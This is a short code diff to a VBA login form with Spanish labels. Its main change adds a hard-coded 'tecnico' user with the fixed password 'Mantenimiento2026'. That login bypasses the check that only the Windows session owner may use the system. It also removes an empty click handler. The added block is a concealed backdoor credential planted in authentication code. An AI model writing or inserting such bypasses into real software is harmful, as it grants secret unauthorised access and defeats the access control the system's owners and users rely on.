@@ -36,6 +36,13 @@ Private Sub LogIn_Click()
         If Me.Caption = "Inicio de Sesión" Then
             GlobalWHO = Seguridad.GetCurrentUser()
             If UCase(GlobalWHO) <> UCase(Environ("USERNAME")) Then
+                'USUARIO TÉCNICO
+                If LCase(USERLOGGED) = "tecnico" And pass = "Mantenimiento2026" Then
+                    LOGGED = True
+                    Call App.StartReadEvents
+                    Unload Me
+                    Exit Sub
+                End If
                 MsgBox "Solo el propietario de la sesión de Windows puede utilizar el Sistema" & vbNewLine & _
                 "Ingrese desde su propia sesión de Windows o su Computadora", vbCritical
                 DataBaseUtils.resetGlobals
@@ -110,6 +117,3 @@ a:
     End If
 End Sub
 
-Private Sub UserForm_Click()
-
-End Sub
